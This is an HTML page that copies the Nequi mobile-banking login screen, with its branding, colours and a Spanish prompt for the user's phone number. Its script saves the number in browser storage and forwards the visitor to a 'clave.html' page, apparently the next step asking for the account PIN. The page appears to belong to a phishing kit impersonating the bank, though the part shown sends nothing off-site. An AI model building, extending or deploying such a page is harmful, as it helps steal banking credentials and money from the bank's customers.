<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nequi</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
    
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      font-family: 'Roboto', sans-serif; 
      background: #1F0A2E;
      height: 100vh; 
      color: white;
      overflow: hidden;
    }
    .container {
      max-width: 420px;
      margin: 0 auto;
      padding: 20px;
      height: 100vh;
      display: flex;
      flex-direction: column;
    }
    .header {
      display: flex;
      justify-content: flex-end;
      padding: 15px 0;
    }
    .help {
      width: 30px; height: 30px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
    }
    .logo {
      font-size: 52px;
      font-weight: 700;
      text-align: center;
      margin: 80px 0 100px 0;
      color: white;
    }
    .logo span { color: #FF2D95; }

    .input-wrapper {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 5px;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      background: #2A1840 !important;
      color: white !important;
      border: none;
      border-radius: 8px;
      padding: 18px 20px;
      font-size: 17px;
      outline: none;
    }
    input::placeholder {
      color: #B8A0D0;
    }

    /* === FIX FUERTE PARA EL FONDO BLANCO DEL AUTOCOMPLETADO === */
    input:-webkit-autofill,
    input:-webkit-autofill:hover,
    input:-webkit-autofill:focus,
    input:-webkit-autofill:active {
      -webkit-text-fill-color: white !important;
      -webkit-box-shadow: 0 0 0 30px #2A1840 inset !important;
      box-shadow: 0 0 0 30px #2A1840 inset !important;
      background: #2A1840 !important;
      transition: background-color 5000s ease-in-out 0s;
    }

    button {
      margin-top: auto;
      height: 58px;
      background: #FF2D95;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      font-weight: 500;
      box-shadow: 0 4px 15px rgba(255, 45, 149, 0.4);
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="help">?</div>
    </div>
    
    <div class="logo">Nequi <span>■</span></div>
    
    <div style="text-align:center; margin-bottom:20px; font-size:18px;">
      Ingresa tu número de celular
    </div>

    <div class="input-wrapper">
      <input type="tel" id="phone" placeholder="300 1234567" maxlength="10" inputmode="numeric">
    </div>

    <button onclick="nextScreen()">Entra</button>
  </div>

  <script>
    function nextScreen() {
      const phone = document.getElementById("phone").value.trim();
      if (phone.length < 10) {
        alert("Por favor ingresa un número válido");
        return;
      }
      localStorage.setItem("phone", phone);
      window.location.href = "clave.html";
    }
  </script>
</body>
</html>
